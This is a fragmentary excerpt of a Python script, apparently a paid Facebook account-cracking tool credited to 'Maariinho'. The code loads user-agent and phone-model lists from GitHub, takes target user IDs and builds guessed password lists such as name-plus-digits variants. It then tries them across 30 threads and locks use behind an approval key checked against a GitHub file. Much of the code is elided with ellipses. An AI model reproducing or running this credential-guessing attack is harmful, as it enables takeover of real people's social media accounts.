#asalamu caleykum OPEN source by Harry (MAARIINHO)
#Bkk 
...
import os,base64
os.system("xdg-open https://www.facebook.com/groups/735164703241352/?ref=share")
...
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Maariinho252/Data/main/sm.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Maariinho252/DATA-FILE/main/UAGNT').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Maariinho252/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
logo=("""\033[1;32m
        ...
        \033[1;32m ##     ##     ######      ###### 
\033[1;32m--------------------------------------------------
{+}\033[1;32mCREATED BY     : \033[1;32mAB MAARIINHO\033[1;32m
{+}\033[1;32mFACEBOOK       : \033[1;32mAB Mohamed Ibrahim Abdullahi\033[1;32m
{+}\033[1;32mYOUTUBE        : \033[1;32mMaariinho\033[1;32m
{+}\033[1;32mVERSION        :\033[1;32m 13.0\033[1;32m
{+}\033[1;32mSTATUS         :\033[1;32m PAID\033[1;32m
--------------------------------------------------
\033[1;37m[-]Maariinho252
--------------------------------------------------""")
def linex():
	print('\033[1;32m--------------------------------------------------')
def clear():
...
def public():
	...
	try:
		plist = []
		try:
			ps_limit = int(input(' How many passwords do you want add ? '))
		except:
			ps_limit =1
		linex()
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://m.me/Maariinho');menu()
			
	elif xd in ['0','00']:
		exit(' Mohamed Ibrahim Abdullahi ')
	else:
		...
		with tred(max_workers=30) as AXI:	
			...
			for psx in user:
				...
				if pcs in ['1','01']:
					...
					passlist = [psx,ids,'Maarmaar','Maar123','Maar1234','Maar12345']
				else:
					passlist = [psx,ids,'Maarmaar','Maar1122','Maar123','Maar1234','Maar1235','Maar143','Maar12','Maar12345']
				if mthd in ['1','01']:
...
def gmail():
		...
		clear()
		print('\033[1;32m example: Mohamed, Jolaa, Abdinasir, feysal , Awais\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;32m example: Abdinasir, Mohamed, Feysal \033[1;97m')
		linex()
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/Maariinho252/blob/main/Ap.txt').text
  ...
  print("""\033[1;32m
         ...
         \033[1;32m ##     ##     ######      ###### 
\033[1;92m--------------------------------------------------
{+}\033[1;32mCREATED BY     : \033[1;32mAB MAAR\033[1;32m
(+}\033[1;32mFACEBOOK       : \033[1;32mAB MAAR\033[1;32m
...
==================================================   """)
  ...
  os.system('xdg-open https://m.me/Maariinho')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.                                      ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/Maariinho252/blob/main/Ap.txt").text
    if id in httpCaht:
      ...
      print("    SUBSCRIBE MY CHENNAL AND GET APPROVAL CHENNAL LINK https://youtube.com/@maariinho "); time.sleep(2)
      os.system('xdg-open https://m.me/Maariinho252')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def tnx():
  ...
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/Maariinho252/MSS/blob/main/Ap.txt").text
    if id in httpCaht:
